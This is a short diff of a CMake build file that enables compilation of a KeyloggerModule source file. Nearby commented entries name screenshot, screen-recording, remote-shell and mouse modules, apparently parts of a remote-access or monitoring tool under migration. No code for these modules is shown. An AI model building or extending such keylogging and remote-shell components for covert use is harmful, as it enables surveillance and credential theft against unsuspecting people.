@@ -32,7 +32,7 @@ set(MODULE_SOURCES
     Modules/ModuleManager.cpp
     # Module implementations will be added during migration:
     # Modules/Implementations/ScreenshotModule.cpp
-    # Modules/Implementations/KeyloggerModule.cpp
+    Modules/Implementations/KeyloggerModule.cpp
     # Modules/Implementations/ScreenRecordingModule.cpp
     # Modules/Implementations/RemoteShellModule.cpp
     # Modules/Implementations/MouseModule.cpp
